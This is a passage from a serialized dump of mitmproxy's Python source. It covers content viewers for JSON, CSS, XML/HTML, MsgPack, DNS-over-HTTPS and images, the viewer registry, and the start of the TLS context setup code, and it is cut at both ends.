url.decode(data)\n        return \"URLEncoded form\", base.format_pairs(d)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type == \"application/x-www-form-urlencoded\")\n", "mitmproxy/contentviews/json.py": "import json\nimport re\nfrom collections.abc import Iterator\nfrom functools import lru_cache\nfrom typing import Any\n\nfrom mitmproxy.contentviews import base\n\nPARSE_ERROR = object()\n\n\n@lru_cache(1)\ndef parse_json(s: bytes) -> Any:\n    try:\n        return json.loads(s.decode(\"utf-8\"))\n    except ValueError:\n        return PARSE_ERROR\n\n\ndef format_json(data: Any) -> Iterator[base.TViewLine]:\n    encoder = json.JSONEncoder(indent=4, sort_keys=True, ensure_ascii=False)\n    current_line: base.TViewLine = []\n    for chunk in encoder.iterencode(data):\n        if \"\\n\" in chunk:\n            rest_of_last_line, chunk = chunk.split(\"\\n\", maxsplit=1)\n            # rest_of_last_line is a delimiter such as , or [\n            current_line.append((\"text\", rest_of_last_line))\n            yield current_line\n            current_line = []\n        if re.match(r'\\s*\"', chunk):\n            if (\n                len(current_line) == 1\n                and current_line[0][0] == \"text\"\n                and current_line[0][1].isspace()\n            ):\n                current_line.append((\"Token_Name_Tag\", chunk))\n            else:\n                current_line.append((\"Token_Literal_String\", chunk))\n        elif re.match(r\"\\s*\\d\", chunk):\n            current_line.append((\"Token_Literal_Number\", chunk))\n        elif re.match(r\"\\s*(true|null|false)\", chunk):\n            current_line.append((\"Token_Keyword_Constant\", chunk))\n        else:\n            current_line.append((\"text\", chunk))\n    yield current_line\n\n\nclass ViewJSON(base.View):\n    name = \"JSON\"\n\n    def __call__(self, data, **metadata):\n        data = parse_json(data)\n        if data is not PARSE_ERROR:\n            return \"JSON\", format_json(data)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        if not data:\n            return 0\n        if content_type in (\n            \"application/json\",\n            \"application/json-rpc\",\n        ):\n            return 1\n        if (\n            content_type\n            and content_type.startswith(\"application/\")\n            and content_type.endswith(\"+json\")\n        ):\n            return 1\n        return 0\n", "mitmproxy/contentviews/dns.py": "from mitmproxy.contentviews import base\nfrom mitmproxy.contentviews.json import format_json\nfrom mitmproxy.dns import Message\n\n\nclass ViewDns(base.View):\n    name = \"DNS-over-HTTPS\"\n\n    def __call__(self, data, **metadata):\n        try:\n            message = Message.unpack(data)\n        except Exception:\n            pass\n        else:\n            return \"DoH\", format_json(message.to_json())\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(content_type == \"application/dns-message\")\n", "mitmproxy/contentviews/css.py": "import re\nimport time\n\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.utils import strutils\n\n\"\"\"\nA custom CSS prettifier. Compared to other prettifiers, its main features are:\n\n- Implemented in pure Python.\n- Modifies whitespace only.\n- Works with any input.\n- Considerably faster than e.g. cssutils.\n\"\"\"\n\nCSS_SPECIAL_AREAS = (\n    \"'\" + strutils.SINGLELINE_CONTENT + strutils.NO_ESCAPE + \"'\",\n    '\"' + strutils.SINGLELINE_CONTENT + strutils.NO_ESCAPE + '\"',\n    r\"/\\*\" + strutils.MULTILINE_CONTENT + r\"\\*/\",\n    \"//\" + strutils.SINGLELINE_CONTENT + \"$\",\n)\nCSS_SPECIAL_CHARS = \"{};:\"\n\n\ndef beautify(data: str, indent: str = \"    \"):\n    \"\"\"Beautify a string containing CSS code\"\"\"\n    data = strutils.escape_special_areas(\n        data.strip(),\n        CSS_SPECIAL_AREAS,\n        CSS_SPECIAL_CHARS,\n    )\n\n    # Add newlines\n    data = re.sub(r\"\\s*;\\s*\", \";\\n\", data)\n    data = re.sub(r\"\\s*{\\s*\", \" {\\n\", data)\n    data = re.sub(r\"\\s*}\\s*\", \"\\n}\\n\\n\", data)\n\n    # Fix incorrect \":\" placement\n    data = re.sub(r\"\\s*:\\s*(?=[^{]+})\", \": \", data)\n    # Fix no space after \",\"\n    data = re.sub(r\"\\s*,\\s*\", \", \", data)\n\n    # indent\n    data = re.sub(\"\\n[ \\t]+\", \"\\n\", data)\n    data = re.sub(\"\\n(?![}\\n])(?=[^{]*})\", \"\\n\" + indent, data)\n\n    data = strutils.unescape_special_areas(data)\n    return data.rstrip(\"\\n\") + \"\\n\"\n\n\nclass ViewCSS(base.View):\n    name = \"CSS\"\n\n    def __call__(self, data, **metadata):\n        data = data.decode(\"utf8\", \"surrogateescape\")\n        beautified = beautify(data)\n        return \"CSS\", base.format_text(beautified)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type == \"text/css\")\n\n\nif __name__ == \"__main__\":  # pragma: no cover\n    with open(\"../tools/web/static/vendor.css\") as f:\n        data = f.read()\n\n    t = time.time()\n    x = beautify(data)\n    print(f\"Beautifying vendor.css took {time.time() - t:.2}s\")\n", "mitmproxy/contentviews/xml_html.py": "import io\nimport re\nimport textwrap\nfrom collections.abc import Iterable\n\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.utils import sliding_window\nfrom mitmproxy.utils import strutils\n\n\"\"\"\nA custom XML/HTML prettifier. Compared to other prettifiers, its main features are:\n\n- Implemented in pure Python.\n- Modifies whitespace only.\n- Works with any input.\n- Lazy evaluation.\n\nThe implementation is split into two main parts: tokenization and formatting of tokens.\n\"\"\"\n\n# http://www.xml.com/pub/a/2001/07/25/namingparts.html - this is close enough for what we do.\nREGEX_TAG = re.compile(r\"[a-zA-Z0-9._:\\-]+(?!=)\")\n# https://www.w3.org/TR/html5/syntax.html#void-elements\nHTML_VOID_ELEMENTS = {\n    \"area\",\n    \"base\",\n    \"br\",\n    \"col\",\n    \"embed\",\n    \"hr\",\n    \"img\",\n    \"input\",\n    \"keygen\",\n    \"link\",\n    \"meta\",\n    \"param\",\n    \"source\",\n    \"track\",\n    \"wbr\",\n}\nNO_INDENT_TAGS = {\"xml\", \"doctype\", \"html\"}\nINDENT = 2\n\n\nclass Token:\n    def __init__(self, data):\n        self.data = data\n\n    def __repr__(self):\n        return f\"{type(self).__name__}({self.data})\"\n\n\nclass Text(Token):\n    @property\n    def text(self):\n        return self.data.strip()\n\n\nclass Tag(Token):\n    @property\n    def tag(self):\n        t = REGEX_TAG.search(self.data)\n        if t is not None:\n            return t.group(0).lower()\n        return \"<empty>\"\n\n    @property\n    def is_comment(self) -> bool:\n        return self.data.startswith(\"<!--\")\n\n    @property\n    def is_cdata(self) -> bool:\n        return self.data.startswith(\"<![CDATA[\")\n\n    @property\n    def is_closing(self):\n        return self.data.startswith(\"</\")\n\n    @property\n    def is_self_closing(self):\n        return (\n            self.is_comment\n            or self.is_cdata\n            or self.data.endswith(\"/>\")\n            or self.tag in HTML_VOID_ELEMENTS\n        )\n\n    @property\n    def is_opening(self):\n        return not self.is_closing and not self.is_self_closing\n\n    @property\n    def done(self):\n        if self.is_comment:\n            return self.data.endswith(\"-->\")\n        elif self.is_cdata:\n            return self.data.endswith(\"]]>\")\n        else:\n            # This fails for attributes that contain an unescaped \">\"\n            return self.data.endswith(\">\")\n\n\ndef tokenize(data: str) -> Iterable[Token]:\n    token: Token = Text(\"\")\n\n    i = 0\n\n    def readuntil(char, start, include=1):\n        nonlocal i\n        end = data.find(char, start)\n        if end == -1:\n            end = len(data)\n        ret = data[i : end + include]\n        i = end + include\n        return ret\n\n    while i < len(data):\n        if isinstance(token, Text):\n            token.data = readuntil(\"<\", i, 0)\n            if token.text:\n                yield token\n            token = Tag(\"\")\n        elif isinstance(token, Tag):\n            token.data += readuntil(\">\", i, 1)\n            if token.done:\n                yield token\n                token = Text(\"\")\n    if token.data.strip():\n        yield token\n\n\ndef indent_text(data: str, prefix: str) -> str:\n    # Add spacing to first line so that we dedent in cases like this:\n    # <li>This is\n    #     example text\n    #     over multiple lines\n    # </li>\n    dedented = textwrap.dedent(\" \" * 32 + data).strip()\n    return textwrap.indent(dedented, prefix[:32])\n\n\ndef is_inline_text(a: Token | None, b: Token | None, c: Token | None) -> bool:\n    if isinstance(a, Tag) and isinstance(b, Text) and isinstance(c, Tag):\n        if a.is_opening and \"\\n\" not in b.data and c.is_closing and a.tag == c.tag:\n            return True\n    return False\n\n\ndef is_inline(\n    prev2: Token | None,\n    prev1: Token | None,\n    t: Token | None,\n    next1: Token | None,\n    next2: Token | None,\n) -> bool:\n    if isinstance(t, Text):\n        return is_inline_text(prev1, t, next1)\n    elif isinstance(t, Tag):\n        if is_inline_text(prev2, prev1, t) or is_inline_text(t, next1, next2):\n            return True\n        if (\n            isinstance(next1, Tag)\n            and t.is_opening\n            and next1.is_closing\n            and t.tag == next1.tag\n        ):\n            return True  # <div></div> (start tag)\n        if (\n            isinstance(prev1, Tag)\n            and prev1.is_opening\n            and t.is_closing\n            and prev1.tag == t.tag\n        ):\n            return True  # <div></div> (end tag)\n    return False\n\n\nclass ElementStack:\n    \"\"\"\n    Keep track of how deeply nested our document is.\n    \"\"\"\n\n    def __init__(self):\n        self.open_tags = []\n        self.indent = \"\"\n\n    def push_tag(self, tag: str):\n        if len(self.open_tags) > 16:\n            return\n        self.open_tags.append(tag)\n        if tag not in NO_INDENT_TAGS:\n            self.indent += \" \" * INDENT\n\n    def pop_tag(self, tag: str):\n        if tag in self.open_tags:\n            remove_indent = 0\n            while True:\n                t = self.open_tags.pop()\n                if t not in NO_INDENT_TAGS:\n                    remove_indent += INDENT\n                if t == tag:\n                    break\n            self.indent = self.indent[:-remove_indent]\n        else:\n            pass  # this closing tag has no start tag. let's keep indentation as-is.\n\n\ndef format_xml(tokens: Iterable[Token]) -> str:\n    out = io.StringIO()\n\n    context = ElementStack()\n\n    for prev2, prev1, token, next1, next2 in sliding_window.window(tokens, 2, 2):\n        if isinstance(token, Tag):\n            if token.is_opening:\n                out.write(indent_text(token.data, context.indent))\n\n                if not is_inline(prev2, prev1, token, next1, next2):\n                    out.write(\"\\n\")\n\n                context.push_tag(token.tag)\n            elif token.is_closing:\n                context.pop_tag(token.tag)\n\n                if is_inline(prev2, prev1, token, next1, next2):\n                    out.write(token.data)\n                else:\n                    out.write(indent_text(token.data, context.indent))\n                out.write(\"\\n\")\n\n            else:  # self-closing\n                out.write(indent_text(token.data, context.indent))\n                out.write(\"\\n\")\n        elif isinstance(token, Text):\n            if is_inline(prev2, prev1, token, next1, next2):\n                out.write(token.text)\n            else:\n                out.write(indent_text(token.data, context.indent))\n                out.write(\"\\n\")\n        else:  # pragma: no cover\n            raise RuntimeError()\n\n    return out.getvalue()\n\n\nclass ViewXmlHtml(base.View):\n    name = \"XML/HTML\"\n    __content_types = (\"text/xml\", \"text/html\")\n\n    def __call__(self, data, **metadata):\n        # TODO:\n        # We should really have the message text as str here,\n        # not the message content as bytes.\n        # https://github.com/mitmproxy/mitmproxy/issues/1662#issuecomment-266192578\n        data = data.decode(\"utf8\", \"xmlcharrefreplace\")\n        tokens = tokenize(data)\n        # TODO:\n        # Performance: Don't render the whole document right away.\n        # Let's wait with this until we have a sequence-like interface,\n        # this thing is reasonably fast right now anyway.\n        pretty = base.format_text(format_xml(tokens))\n        if \"html\" in data.lower():\n            t = \"HTML\"\n        else:\n            t = \"XML\"\n        return t, pretty\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        if not data:\n            return 0\n        if content_type in self.__content_types:\n            return 1\n        elif strutils.is_xml(data):\n            return 0.4\n        return 0\n", "mitmproxy/contentviews/msgpack.py": "from typing import Any\n\nimport msgpack\n\nfrom mitmproxy.contentviews import base\n\nPARSE_ERROR = object()\n\n\ndef parse_msgpack(s: bytes) -> Any:\n    try:\n        return msgpack.unpackb(s, raw=False)\n    except (ValueError, msgpack.ExtraData, msgpack.FormatError, msgpack.StackError):\n        return PARSE_ERROR\n\n\ndef format_msgpack(\n    data: Any, output=None, indent_count: int = 0\n) -> list[base.TViewLine]:\n    if output is None:\n        output = [[]]\n\n    indent = (\"text\", \"    \" * indent_count)\n\n    if isinstance(data, str):\n        token = [(\"Token_Literal_String\", f'\"{data}\"')]\n        output[-1] += token\n\n        # Need to return if single value, but return is discarded in dict/list loop\n        return output\n\n    elif isinstance(data, bool):\n        token = [(\"Token_Keyword_Constant\", repr(data))]\n        output[-1] += token\n\n        return output\n\n    elif isinstance(data, float | int):\n        token = [(\"Token_Literal_Number\", repr(data))]\n        output[-1] += token\n\n        return output\n\n    elif isinstance(data, dict):\n        output[-1] += [(\"text\", \"{\")]\n        for key in data:\n            output.append(\n                [\n                    indent,\n                    (\"text\", \"    \"),\n                    (\"Token_Name_Tag\", f'\"{key}\"'),\n                    (\"text\", \": \"),\n                ]\n            )\n            format_msgpack(data[key], output, indent_count + 1)\n\n            if key != list(data)[-1]:\n                output[-1] += [(\"text\", \",\")]\n\n        output.append([indent, (\"text\", \"}\")])\n\n        return output\n\n    elif isinstance(data, list):\n        output[-1] += [(\"text\", \"[\")]\n\n        for count, item in enumerate(data):\n            output.append([indent, (\"text\", \"    \")])\n            format_msgpack(item, output, indent_count + 1)\n            if count != len(data) - 1:\n                output[-1] += [(\"text\", \",\")]\n\n        output.append([indent, (\"text\", \"]\")])\n\n        return output\n\n    else:\n        token = [(\"text\", repr(data))]\n        output[-1] += token\n\n        return output\n\n\nclass ViewMsgPack(base.View):\n    name = \"MsgPack\"\n    __content_types = (\n        \"application/msgpack\",\n        \"application/x-msgpack\",\n    )\n\n    def __call__(self, data, **metadata):\n        data = parse_msgpack(data)\n        if data is not PARSE_ERROR:\n            return \"MsgPack\", format_msgpack(data)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type in self.__content_types)\n", "mitmproxy/contentviews/__init__.py": "\"\"\"\nMitmproxy Content Views\n=======================\n\nmitmproxy includes a set of content views which can be used to\nformat/decode/highlight data. While they are mostly used for HTTP message\nbodies, the may be used in other contexts, e.g. to decode WebSocket messages.\n\nThus, the View API is very minimalistic. The only arguments are `data` and\n`**metadata`, where `data` is the actual content (as bytes). The contents on\nmetadata depend on the protocol in use. Known attributes can be found in\n`base.View`.\n\"\"\"\n\nimport traceback\n\nfrom ..tcp import TCPMessage\nfrom ..udp import UDPMessage\nfrom ..websocket import WebSocketMessage\nfrom . import auto\nfrom . import css\nfrom . import dns\nfrom . import graphql\nfrom . import grpc\nfrom . import hex\nfrom . import http3\nfrom . import image\nfrom . import javascript\nfrom . import json\nfrom . import mqtt\nfrom . import msgpack\nfrom . import multipart\nfrom . import protobuf\nfrom . import query\nfrom . import raw\nfrom . import urlencoded\nfrom . import wbxml\nfrom . import xml_html\nfrom .base import format_dict\nfrom .base import format_text\nfrom .base import KEY_MAX\nfrom .base import TViewResult\nfrom .base import View\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy.utils import signals\nfrom mitmproxy.utils import strutils\n\nviews: list[View] = []\n\n\ndef _update(view: View) -> None: ...\n\n\non_add = signals.SyncSignal(_update)\n\"\"\"A new contentview has been added.\"\"\"\non_remove = signals.SyncSignal(_update)\n\"\"\"A contentview has been removed.\"\"\"\n\n\ndef get(name: str) -> View | None:\n    for i in views:\n        if i.name.lower() == name.lower():\n            return i\n    return None\n\n\ndef add(view: View) -> None:\n    # TODO: auto-select a different name (append an integer?)\n    for i in views:\n        if i.name == view.name:\n            raise ValueError(\"Duplicate view: \" + view.name)\n\n    views.append(view)\n    on_add.send(view)\n\n\ndef remove(view: View) -> None:\n    views.remove(view)\n    on_remove.send(view)\n\n\ndef safe_to_print(lines, encoding=\"utf8\"):\n    \"\"\"\n    Wraps a content generator so that each text portion is a *safe to print* unicode string.\n    \"\"\"\n    for line in lines:\n        clean_line = []\n        for style, text in line:\n            if isinstance(text, bytes):\n                text = text.decode(encoding, \"replace\")\n            text = strutils.escape_control_characters(text)\n            clean_line.append((style, text))\n        yield clean_line\n\n\ndef get_message_content_view(\n    viewname: str,\n    message: http.Message | TCPMessage | UDPMessage | WebSocketMessage,\n    flow: flow.Flow,\n):\n    \"\"\"\n    Like get_content_view, but also handles message encoding.\n    \"\"\"\n    viewmode = get(viewname)\n    if not viewmode:\n        viewmode = get(\"auto\")\n    assert viewmode\n\n    content: bytes | None\n    try:\n        content = message.content\n    except ValueError:\n        assert isinstance(message, http.Message)\n        content = message.raw_content\n        enc = \"[cannot decode]\"\n    else:\n        if isinstance(message, http.Message) and content != message.raw_content:\n            enc = \"[decoded {}]\".format(message.headers.get(\"content-encoding\"))\n        else:\n            enc = \"\"\n\n    if content is None:\n        return \"\", iter([[(\"error\", \"content missing\")]]), None\n\n    content_type = None\n    http_message = None\n    if isinstance(message, http.Message):\n        http_message = message\n        if ctype := message.headers.get(\"content-type\"):\n            if ct := http.parse_content_type(ctype):\n                content_type = f\"{ct[0]}/{ct[1]}\"\n\n    tcp_message = None\n    if isinstance(message, TCPMessage):\n        tcp_message = message\n\n    udp_message = None\n    if isinstance(message, UDPMessage):\n        udp_message = message\n\n    description, lines, error = get_content_view(\n        viewmode,\n        content,\n        content_type=content_type,\n        flow=flow,\n        http_message=http_message,\n        tcp_message=tcp_message,\n        udp_message=udp_message,\n    )\n\n    if enc:\n        description = f\"{enc} {description}\"\n\n    return description, lines, error\n\n\ndef get_content_view(\n    viewmode: View,\n    data: bytes,\n    *,\n    content_type: str | None = None,\n    flow: flow.Flow | None = None,\n    http_message: http.Message | None = None,\n    tcp_message: tcp.TCPMessage | None = None,\n    udp_message: udp.UDPMessage | None = None,\n):\n    \"\"\"\n    Args:\n        viewmode: the view to use.\n        data, **metadata: arguments passed to View instance.\n\n    Returns:\n        A (description, content generator, error) tuple.\n        If the content view raised an exception generating the view,\n        the exception is returned in error and the flow is formatted in raw mode.\n        In contrast to calling the views directly, text is always safe-to-print unicode.\n    \"\"\"\n    try:\n        ret = viewmode(\n            data,\n            content_type=content_type,\n            flow=flow,\n            http_message=http_message,\n            tcp_message=tcp_message,\n            udp_message=udp_message,\n        )\n        if ret is None:\n            ret = (\n                \"Couldn't parse: falling back to Raw\",\n                get(\"Raw\")(\n                    data,\n                    content_type=content_type,\n                    flow=flow,\n                    http_message=http_message,\n                    tcp_message=tcp_message,\n                    udp_message=udp_message,\n                )[1],\n            )\n        desc, content = ret\n        error = None\n    # Third-party viewers can fail in unexpected ways...\n    except Exception:\n        desc = \"Couldn't parse: falling back to Raw\"\n        raw = get(\"Raw\")\n        assert raw\n        content = raw(\n            data,\n            content_type=content_type,\n            flow=flow,\n            http_message=http_message,\n            tcp_message=tcp_message,\n            udp_message=udp_message,\n        )[1]\n        error = f\"{getattr(viewmode, 'name')} content viewer failed: \\n{traceback.format_exc()}\"\n\n    return desc, safe_to_print(content), error\n\n\n# The order in which ContentViews are added is important!\nadd(auto.ViewAuto())\nadd(raw.ViewRaw())\nadd(hex.ViewHexStream())\nadd(hex.ViewHexDump())\nadd(graphql.ViewGraphQL())\nadd(json.ViewJSON())\nadd(xml_html.ViewXmlHtml())\nadd(wbxml.ViewWBXML())\nadd(javascript.ViewJavaScript())\nadd(css.ViewCSS())\nadd(urlencoded.ViewURLEncoded())\nadd(multipart.ViewMultipart())\nadd(image.ViewImage())\nadd(query.ViewQuery())\nadd(protobuf.ViewProtobuf())\nadd(msgpack.ViewMsgPack())\nadd(grpc.ViewGrpcProtobuf())\nadd(mqtt.ViewMQTT())\nadd(http3.ViewHttp3())\nadd(dns.ViewDns())\n\n__all__ = [\n    \"View\",\n    \"KEY_MAX\",\n    \"format_text\",\n    \"format_dict\",\n    \"TViewResult\",\n    \"get\",\n    \"add\",\n    \"remove\",\n    \"get_content_view\",\n    \"get_message_content_view\",\n]\n", "mitmproxy/contentviews/image/image_parser.py": "import io\n\nfrom kaitaistruct import KaitaiStream\n\nfrom mitmproxy.contrib.kaitaistruct import gif\nfrom mitmproxy.contrib.kaitaistruct import ico\nfrom mitmproxy.contrib.kaitaistruct import jpeg\nfrom mitmproxy.contrib.kaitaistruct import png\n\nMetadata = list[tuple[str, str]]\n\n\ndef parse_png(data: bytes) -> Metadata:\n    img = png.Png(KaitaiStream(io.BytesIO(data)))\n    parts = [\n        (\"Format\", \"Portable network graphics\"),\n        (\"Size\", f\"{img.ihdr.width} x {img.ihdr.height} px\"),\n    ]\n    for chunk in img.chunks:\n        if chunk.type == \"gAMA\":\n            parts.append((\"gamma\", str(chunk.body.gamma_int / 100000)))\n        elif chunk.type == \"pHYs\":\n            aspectx = chunk.body.pixels_per_unit_x\n            aspecty = chunk.body.pixels_per_unit_y\n            parts.append((\"aspect\", f\"{aspectx} x {aspecty}\"))\n        elif chunk.type == \"tEXt\":\n            parts.append((chunk.body.keyword, chunk.body.text))\n        elif chunk.type == \"iTXt\":\n            parts.append((chunk.body.keyword, chunk.body.text))\n        elif chunk.type == \"zTXt\":\n            parts.append(\n                (chunk.body.keyword, chunk.body.text_datastream.decode(\"iso8859-1\"))\n            )\n    return parts\n\n\ndef parse_gif(data: bytes) -> Metadata:\n    img = gif.Gif(KaitaiStream(io.BytesIO(data)))\n    descriptor = img.logical_screen_descriptor\n    parts = [\n        (\"Format\", \"Compuserve GIF\"),\n        (\"Version\", f\"GIF{img.hdr.version}\"),\n        (\"Size\", f\"{descriptor.screen_width} x {descriptor.screen_height} px\"),\n        (\"background\", str(descriptor.bg_color_index)),\n    ]\n    ext_blocks = []\n    for block in img.blocks:\n        if block.block_type.name == \"extension\":\n            ext_blocks.append(block)\n    comment_blocks = []\n    for block in ext_blocks:\n        if block.body.label._name_ == \"comment\":\n            comment_blocks.append(block)\n    for block in comment_blocks:\n        entries = block.body.body.entries\n        for entry in entries:\n            comment = entry.bytes\n            if comment != b\"\":\n                parts.append((\"comment\", str(comment)))\n    return parts\n\n\ndef parse_jpeg(data: bytes) -> Metadata:\n    img = jpeg.Jpeg(KaitaiStream(io.BytesIO(data)))\n    parts = [(\"Format\", \"JPEG (ISO 10918)\")]\n    for segment in img.segments:\n        if segment.marker._name_ == \"sof0\":\n            parts.append(\n                (\"Size\", f\"{segment.data.image_width} x {segment.data.image_height} px\")\n            )\n        if segment.marker._name_ == \"app0\":\n            parts.append(\n                (\n                    \"jfif_version\",\n                    f\"({segment.data.version_major}, {segment.data.version_minor})\",\n                )\n            )\n            parts.append(\n                (\n                    \"jfif_density\",\n                    f\"({segment.data.density_x}, {segment.data.density_y})\",\n                )\n            )\n            parts.append((\"jfif_unit\", str(segment.data.density_units._value_)))\n        if segment.marker._name_ == \"com\":\n            parts.append((\"comment\", str(segment.data)))\n        if segment.marker._name_ == \"app1\":\n            if hasattr(segment.data, \"body\"):\n                for field in segment.data.body.data.body.ifd0.fields:\n                    if field.data is not None:\n                        parts.append(\n                            (field.tag._name_, field.data.decode(\"UTF-8\").strip(\"\\x00\"))\n                        )\n    return parts\n\n\ndef parse_ico(data: bytes) -> Metadata:\n    img = ico.Ico(KaitaiStream(io.BytesIO(data)))\n    parts = [\n        (\"Format\", \"ICO\"),\n        (\"Number of images\", str(img.num_images)),\n    ]\n\n    for i, image in enumerate(img.images):\n        parts.append(\n            (\n                f\"Image {i + 1}\",\n                \"Size: {} x {}\\n\" \"{: >18}Bits per pixel: {}\\n\" \"{: >18}PNG: {}\".format(\n                    256 if not image.width else image.width,\n                    256 if not image.height else image.height,\n                    \"\",\n                    image.bpp,\n                    \"\",\n                    image.is_png,\n                ),\n            )\n        )\n\n    return parts\n", "mitmproxy/contentviews/image/view.py": "from . import image_parser\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.contrib import imghdr\nfrom mitmproxy.coretypes import multidict\n\n\ndef test_ico(h, f):\n    if h.startswith(b\"\\x00\\x00\\x01\\x00\"):\n        return \"ico\"\n\n\nimghdr.tests.append(test_ico)\n\n\nclass ViewImage(base.View):\n    name = \"Image\"\n\n    def __call__(self, data, **metadata):\n        image_type = imghdr.what(\"\", h=data)\n        if image_type == \"png\":\n            image_metadata = image_parser.parse_png(data)\n        elif image_type == \"gif\":\n            image_metadata = image_parser.parse_gif(data)\n        elif image_type == \"jpeg\":\n            image_metadata = image_parser.parse_jpeg(data)\n        elif image_type == \"ico\":\n            image_metadata = image_parser.parse_ico(data)\n        else:\n            image_metadata = [(\"Image Format\", image_type or \"unknown\")]\n        if image_type:\n            view_name = f\"{image_type.upper()} Image\"\n        else:\n            view_name = \"Unknown Image\"\n        return view_name, base.format_dict(multidict.MultiDict(image_metadata))\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(\n            bool(\n                content_type\n                and content_type.startswith(\"image/\")\n                and content_type != \"image/svg+xml\"\n            )\n        )\n", "mitmproxy/contentviews/image/__init__.py": "from .view import ViewImage\n\n__all__ = [\"ViewImage\"]\n", "mitmproxy/net/tls.py": "import os\nimport threading\nfrom collections.abc import Callable\nfrom collections.abc import Iterable\nfrom enum import Enum\nfrom functools import lru_cache\nfrom pathlib import Path\nfrom typing import Any\nfrom typing import BinaryIO\n\nimport certifi\nfrom OpenSSL import crypto\nfrom OpenSSL import SSL\nfrom OpenSSL.crypto import X509\n\nfrom mitmproxy import certs\n\n# Remove once pyOpenSSL 23.3.0 is released and bump version in pyproject.toml.\ntry:  # pragma: no cover\n    from OpenSSL.SSL import OP_LEGACY_SERVER_CONNECT  # type: ignore\nexcept ImportError:\n    OP_LEGACY_SERVER_CONNECT = 0x4\n\n\n# redeclared here for strict type checking\nclass Method(Enum):\n    TLS_SERVER_METHOD = SSL.TLS_SERVER_METHOD\n    TLS_CLIENT_METHOD = SSL.TLS_CLIENT_METHOD\n    # Type-pyopenssl does not know about these DTLS constants.\n    DTLS_SERVER_METHOD = SSL.DTLS_SERVER_METHOD  # type: ignore\n    DTLS_CLIENT_METHOD = SSL.DTLS_CLIENT_METHOD  # type: ignore\n\n\ntry:\n    SSL._lib.TLS_server_method  # type: ignore\nexcept AttributeError as e:  # pragma: no cover\n    raise RuntimeError(\n        \"Your installation of the cryptography Python package is outdated.\"\n    ) from e\n\n\nclass Version(Enum):\n    UNBOUNDED = 0\n    SSL3 = SSL.SSL3_VERSION\n    TLS1 = SSL.TLS1_VERSION\n    TLS1_1 = SSL.TLS1_1_VERSION\n    TLS1_2 = SSL.TLS1_2_VERSION\n    TLS1_3 = SSL.TLS1_3_VERSION\n\n\nclass Verify(Enum):\n    VERIFY_NONE = SSL.VERIFY_NONE\n    VERIFY_PEER = SSL.VERIFY_PEER\n\n\nDEFAULT_MIN_VERSION = Version.TLS1_2\nDEFAULT_MAX_VERSION = Version.UNBOUNDED\nDEFAULT_OPTIONS = SSL.OP_CIPHER_SERVER_PREFERENCE | SSL.OP_NO_COMPRESSION\n\n\nclass MasterSecretLogger:\n    def __init__(self, filename: Path):\n        self.filename = filename.expanduser()\n        self.f: BinaryIO | None = None\n        self.lock = threading.Lock()\n\n    # required for functools.wraps, which pyOpenSSL uses.\n    __name__ = \"MasterSecretLogger\"\n\n    def __call__(self, connection: SSL.Connection, keymaterial: bytes) -> None:\n        with self.lock:\n            if self.f is None:\n                self.filename.parent.mkdir(parents=True, exist_ok=True)\n                self.f = self.filename.open(\"ab\")\n                self.f.write(b\"\\n\")\n            self.f.write(keymaterial + b\"\\n\")\n            self.f.flush()\n\n    def close(self):\n        with self.lock:\n            if self.f is not None:\n                self.f.close()\n\n\ndef make_master_secret_logger(filename: str | None) -> MasterSecretLogger | None:\n    if filename:\n        return MasterSecretLogger(Path(filename))\n    return None\n\n\nlog_master_secret = make_master_secret_logger(\n    os.getenv(\"MITMPROXY_SSLKEYLOGFILE\") or os.getenv(\"SSLKEYLOGFILE\")\n)\n\n\ndef _create_ssl_context(\n    *,\n    method: Method,\n    min_version: Version,\n    max_version: Version,\n    cipher_list: Iterable[str] | None,\n    ecdh_curve: str | None,\n) -> SSL.Context:\n    context = SSL.Context(method.value)\n\n    ok = SSL._lib.SSL_CTX_set_min_proto_version(context._context, min_version.value)  # type: ignore\n    ok += SSL._lib.SSL_CTX_set_max_proto_version(context._context, max_version.value)  # type: ignore\n    if ok != 2:\n        raise RuntimeError(\n            f\"Error setting TLS versions ({min_version=}, {max_version=}). \"\n            \"The version you specified may be unavailable in your libssl.\"\n        )\n\n    # Options\n    context.set_options(DEFAULT_OPTIONS)\n\n    # ECDHE for Key exchange\n    if ecdh_curve is not None:\n        try:\n            context.set_tmp_ecdh(crypto.get_elliptic_curve(ecdh_curve))\n        except ValueError as e:\n            raise RuntimeError(f\"Elliptic curve specification error: {e}\") from e\n\n    # Cipher List\n    if cipher_list is not None:\n        try:\n            context.set_cipher_list(b\":\".join(x.encode() for x in cipher_list))\n        except SSL.Error as e:\n            raise RuntimeError(f\"SSL cipher specification error: {e}\") from e\n\n    # SSLKEYLOGFILE\n    if log_master_secret:\n        context.set_keylog_callback(log_master_secret)\n\n    return context\n\n\n@lru_cache(256)\ndef create_proxy_server_context(\n    *,\n    method: Method,\n    min_version: Version,\n    max_version: Version,\n    cipher_list: tuple[str, ...] | None,\n    ecdh_curve: str | None,\n    verify: Verify,\n    ca_path: str | None,\n    ca_pemfile: str | None,\n    client_cert: str | None,\n    legacy_server_connect: bool,\n) -> SSL.Context:\n    context: SSL.Context = _create_ssl_context(\n        method=method,\n        min_version=min_version,\n        max_version=max_version,\n        cipher_list=cipher_list,\n        ecdh_curve=ecdh_curve,\n    )\n    context.set_verify(verify.value, None)\n\n    if ca_path is None and ca_pemfile is None:\n        ca_pemfile = certifi.where()\n    try:\n        context.load_verify_locations(ca_pemfile, ca_path)\n    except SSL.Error as e:\n        raise RuntimeError(\n            f\"Cannot load trusted certificates ({ca_pemfile=}, {ca_path=}).\"\n        ) from e\n\n    # Client Certs\n    if client_cert:\n        try:\n            